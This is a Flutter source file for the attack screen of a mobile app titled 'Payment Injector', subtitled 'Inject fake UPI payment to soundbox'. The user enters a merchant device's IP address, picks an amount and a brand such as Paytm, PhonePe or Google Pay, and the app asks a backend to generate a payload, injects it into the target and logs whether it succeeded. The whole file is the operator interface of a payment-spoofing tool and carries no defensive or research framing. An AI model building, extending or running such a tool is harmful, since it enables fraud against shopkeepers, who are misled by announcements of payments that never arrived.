import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:uuid/uuid.dart';
import '../theme/app_theme.dart';
import '../services/api_service.dart';
import '../services/database_service.dart';
import '../models/device_model.dart';
import '../models/transaction_model.dart';

class AttackScreen extends StatefulWidget {
  const AttackScreen({super.key});

  @override
  State<AttackScreen> createState() => _AttackScreenState();
}

class _AttackScreenState extends State<AttackScreen> {
  static const List<double> _amountChips = [100, 200, 500, 1000, 2000, 5000];
  static const List<Map<String, dynamic>> _vendors = [
    {'id': 'paytm', 'name': 'Paytm', 'color': Color(0xFF0066CC), 'icon': '₹'},
    {'id': 'phonepe', 'name': 'PhonePe', 'color': Color(0xFF5F259F), 'icon': 'P'},
    {'id': 'gpay', 'name': 'Google Pay', 'color': Color(0xFF4285F4), 'icon': 'G'},
    {'id': 'bharatpe', 'name': 'BharatPe', 'color': Color(0xFF00C853), 'icon': 'B'},
    {'id': 'generic', 'name': 'Generic UPI', 'color': Color(0xFF607D8B), 'icon': 'U'},
  ];

  double _selectedAmount = 500;
  int _selectedVendorIndex = 0;
  String _apiBaseUrl = 'http://localhost:3000';
  String _targetIP = '';
  bool _isInjecting = false;
  String? _lastResult;
  bool _lastSuccess = false;
  List<DeviceModel> _savedDevices = [];
  final TextEditingController _customAmountController = TextEditingController();
  final TextEditingController _targetIPController = TextEditingController();
  final TextEditingController _apiUrlController = TextEditingController();
  bool _useCustomAmount = false;

  @override
  void initState() {
    super.initState();
    _apiUrlController.text = _apiBaseUrl;
    _loadDevices();
  }

  @override
  void dispose() {
    _customAmountController.dispose();
    _targetIPController.dispose();
    _apiUrlController.dispose();
    super.dispose();
  }

  Future<void> _loadDevices() async {
    final devices = await DatabaseService.instance.getAllDevices();
    setState(() => _savedDevices = devices);
  }

  Future<void> _inject() async {
    final amount = _useCustomAmount
        ? double.tryParse(_customAmountController.text) ?? _selectedAmount
        : _selectedAmount;
    final targetIP = _targetIPController.text.trim();
    final apiUrl = _apiUrlController.text.trim();

    if (targetIP.isEmpty) {
      _showSnack('Enter a target IP address', isError: true);
      return;
    }

    final ipRegex = RegExp(r'^(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?$');
    if (!ipRegex.hasMatch(targetIP)) {
      _showSnack('Invalid IP format (e.g. 192.168.1.1:8080)', isError: true);
      return;
    }

    setState(() {
      _isInjecting = true;
      _lastResult = null;
    });

    const uuid = Uuid();
    final txnId = uuid.v4();
    final vendor = _vendors[_selectedVendorIndex]['id'] as String;

    try {
      final api = ApiService(baseUrl: apiUrl);
      final generated = await api.generatePayload(vendor: vendor, amount: amount);
      final payload = generated['payload'] as Map<String, dynamic>;
      final result = await api.proxyInject(targetIP: targetIP, payload: payload);

      final success = result['success'] == true;
      final txn = TransactionModel(
        id: txnId,
        vendor: vendor,
        amount: amount,
        targetIP: targetIP,
        isSuccess: success,
        status: success ? 'SUCCESS' : 'FAILED',
        errorMessage: success ? null : result['error']?.toString(),
        createdAt: DateTime.now(),
      );
      await DatabaseService.instance.insertTransaction(txn);

      setState(() {
        _isInjecting = false;
        _lastSuccess = success;
        _lastResult = success
            ? 'Payment injected successfully to $targetIP'
            : result['error']?.toString() ?? 'Injection failed';
      });
    } catch (e) {
      final txn = TransactionModel(
        id: txnId,
        vendor: vendor,
        amount: amount,
        targetIP: targetIP,
        isSuccess: false,
        status: 'ERROR',
        errorMessage: e.toString(),
        createdAt: DateTime.now(),
      );
      await DatabaseService.instance.insertTransaction(txn);

      setState(() {
        _isInjecting = false;
        _lastSuccess = false;
        _lastResult = e.toString();
      });
    }
  }

  void _showSnack(String msg, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg),
        backgroundColor: isError ? AppTheme.errorRed : AppTheme.successGreen,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.background,
      body: CustomScrollView(
        slivers: [
          SliverAppBar(
            pinned: true,
            backgroundColor: AppTheme.successGreen,
            expandedHeight: 130,
            flexibleSpace: FlexibleSpaceBar(
              background: Container(
                decoration: const BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Color(0xFF00B386), Color(0xFF009970)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                ),
                child: SafeArea(
                  child: Padding(
                    padding: const EdgeInsets.fromLTRB(20, 16, 20, 0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text('Payment Injector',
                            style: GoogleFonts.roboto(
                              color: Colors.white,
                              fontSize: 22,
                              fontWeight: FontWeight.w700,
                            )),
                        const SizedBox(height: 4),
                        Text('Inject fake UPI payment to soundbox',
                            style: GoogleFonts.roboto(
                                color: Colors.white.withOpacity(0.85),
                                fontSize: 13)),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
          SliverToBoxAdapter(
            child: Padding(
              padding: const EdgeInsets.all(16),
              child: Column(
                children: [
                  _buildApiConfig(),
                  const SizedBox(height: 16),
                  _buildTargetSection(),
                  const SizedBox(height: 16),
                  _buildAmountSection(),
                  const SizedBox(height: 16),
                  _buildVendorSection(),
                  const SizedBox(height: 20),
                  _buildInjectButton(),
                  if (_lastResult != null) ...[
                    const SizedBox(height: 16),
                    _buildResultCard(),
                  ],
                  const SizedBox(height: 80),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildApiConfig() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Icon(Icons.cloud_outlined,
                color: AppTheme.primaryBlue, size: 20),
            const SizedBox(width: 8),
            Text('API Server',
                style: GoogleFonts.roboto(
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                    color: AppTheme.textDark)),
          ]),
          const SizedBox(height: 12),
          TextField(
            controller: _apiUrlController,
            onChanged: (v) => _apiBaseUrl = v,
            decoration: const InputDecoration(
              hintText: 'https://your-app.onrender.com',
              prefixIcon: Icon(Icons.link, size: 20),
              isDense: true,
            ),
            style: GoogleFonts.robotoMono(fontSize: 13),
          ),
        ],
      ),
    );
  }

  Widget _buildTargetSection() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Icon(Icons.router, color: AppTheme.accentOrange, size: 20),
            const SizedBox(width: 8),
            Text('Target Device',
                style: GoogleFonts.roboto(
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                    color: AppTheme.textDark)),
          ]),
          const SizedBox(height: 12),
          TextField(
            controller: _targetIPController,
            onChanged: (v) => _targetIP = v,
            decoration: const InputDecoration(
              hintText: '192.168.1.100:8080',
              prefixIcon: Icon(Icons.wifi_tethering, size: 20),
              isDense: true,
            ),
            keyboardType: TextInputType.number,
            style: GoogleFonts.robotoMono(fontSize: 14),
          ),
          if (_savedDevices.isNotEmpty) ...[
            const SizedBox(height: 12),
            Text('Saved devices:',
                style: GoogleFonts.roboto(
                    fontSize: 12, color: AppTheme.textGrey)),
            const SizedBox(height: 8),
            Wrap(
              spacing: 8,
              runSpacing: 6,
              children: _savedDevices.take(5).map((d) {
                return GestureDetector(
                  onTap: () {
                    _targetIPController.text = d.address;
                    setState(() => _targetIP = d.address);
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 10, vertical: 6),
                    decoration: BoxDecoration(
                      color: AppTheme.primaryBlue.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                          color: AppTheme.primaryBlue.withOpacity(0.2)),
                    ),
                    child: Text(
                      d.address,
                      style: GoogleFonts.robotoMono(
                          fontSize: 12, color: AppTheme.primaryBlue),
                    ),
                  ),
                );
              }).toList(),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildAmountSection() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.currency_rupee,
                  color: AppTheme.accentOrange, size: 20),
              const SizedBox(width: 8),
              Text('Amount',
                  style: GoogleFonts.roboto(
                      fontSize: 15,
                      fontWeight: FontWeight.w600,
                      color: AppTheme.textDark)),
              const Spacer(),
              Text(
                '₹${_useCustomAmount ? (_customAmountController.text.isEmpty ? '0' : _customAmountController.text) : _selectedAmount.toStringAsFixed(0)}',
                style: GoogleFonts.roboto(
                  fontSize: 18,
                  fontWeight: FontWeight.w800,
                  color: AppTheme.primaryBlue,
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: _amountChips.map((amount) {
              final isSelected =
                  !_useCustomAmount && _selectedAmount == amount;
              return GestureDetector(
                onTap: () => setState(() {
                  _selectedAmount = amount;
                  _useCustomAmount = false;
                  _customAmountController.clear();
                }),
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  padding: const EdgeInsets.symmetric(
                      horizontal: 16, vertical: 10),
                  decoration: BoxDecoration(
                    gradient: isSelected ? AppTheme.paytmGradient : null,
                    color: isSelected ? null : Colors.white,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: isSelected
                          ? AppTheme.accentOrange
                          : AppTheme.divider,
                      width: isSelected ? 0 : 1,
                    ),
                    boxShadow: isSelected
                        ? [
                            BoxShadow(
                              color: AppTheme.accentOrange.withOpacity(0.3),
                              blurRadius: 8,
                              offset: const Offset(0, 3),
                            )
                          ]
                        : null,
                  ),
                  child: Text(
                    '₹${amount.toStringAsFixed(0)}',
                    style: GoogleFonts.roboto(
                      fontSize: 14,
                      fontWeight: FontWeight.w600,
                      color: isSelected ? Colors.white : AppTheme.textDark,
                    ),
                  ),
                ),
              );
            }).toList(),
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Checkbox(
                value: _useCustomAmount,
                onChanged: (v) => setState(() => _useCustomAmount = v ?? false),
                activeColor: AppTheme.primaryBlue,
                materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
              ),
              const SizedBox(width: 4),
              Text('Custom amount',
                  style: GoogleFonts.roboto(
                      fontSize: 13, color: AppTheme.textGrey)),
            ],
          ),
          if (_useCustomAmount) ...[
            const SizedBox(height: 8),
            TextField(
              controller: _customAmountController,
              decoration: const InputDecoration(
                hintText: 'Enter amount',
                prefixText: '₹ ',
                isDense: true,
              ),
              keyboardType:
                  const TextInputType.numberWithOptions(decimal: true),
              onChanged: (_) => setState(() {}),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildVendorSection() {
    return PaytmCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Icon(Icons.store, color: AppTheme.primaryBlue, size: 20),
            const SizedBox(width: 8),
            Text('Select Vendor',
                style: GoogleFonts.roboto(
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                    color: AppTheme.textDark)),
          ]),
          const SizedBox(height: 12),
          ..._vendors.asMap().entries.map((entry) {
            final i = entry.key;
            final v = entry.value;
            final isSelected = _selectedVendorIndex == i;
            final color = v['color'] as Color;

            return GestureDetector(
              onTap: () => setState(() => _selectedVendorIndex = i),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 180),
                margin: const EdgeInsets.only(bottom: 8),
                padding:
                    const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                decoration: BoxDecoration(
                  color:
                      isSelected ? color.withOpacity(0.07) : Colors.grey.shade50,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: isSelected ? color : AppTheme.divider,
                    width: isSelected ? 1.5 : 1,
                  ),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 38,
                      height: 38,
                      decoration: BoxDecoration(
                        color: color,
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: Center(
                        child: Text(
                          v['icon'] as String,
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontWeight: FontWeight.w800,
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        v['name'] as String,
                        style: GoogleFonts.roboto(
                          fontSize: 14,
                          fontWeight: FontWeight.w600,
                          color: isSelected ? color : AppTheme.textDark,
                        ),
                      ),
                    ),
                    if (isSelected)
                      Icon(Icons.check_circle, color: color, size: 20),
                  ],
                ),
              ),
            );
          }),
        ],
      ),
    );
  }

  Widget _buildInjectButton() {
    return PaytmGreenButton(
      label: 'INJECT PAYMENT',
      onPressed: _isInjecting ? null : _inject,
      isLoading: _isInjecting,
      icon: Icons.send,
    );
  }

  Widget _buildResultCard() {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      child: PaytmCard(
        color: _lastSuccess
            ? AppTheme.successGreen.withOpacity(0.06)
            : AppTheme.errorRed.withOpacity(0.06),
        child: Row(
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: _lastSuccess
                    ? AppTheme.successGreen.withOpacity(0.15)
                    : AppTheme.errorRed.withOpacity(0.15),
                shape: BoxShape.circle,
              ),
              child: Icon(
                _lastSuccess ? Icons.check_circle : Icons.error,
                color: _lastSuccess ? AppTheme.successGreen : AppTheme.errorRed,
                size: 24,
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    _lastSuccess ? 'Injection Successful' : 'Injection Failed',
                    style: GoogleFonts.roboto(
                      fontSize: 14,
                      fontWeight: FontWeight.w700,
                      color: _lastSuccess
                          ? AppTheme.successGreen
                          : AppTheme.errorRed,
                    ),
                  ),
                  const SizedBox(height: 3),
                  Text(
                    _lastResult ?? '',
                    style: GoogleFonts.roboto(
                        fontSize: 12, color: AppTheme.textGrey),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
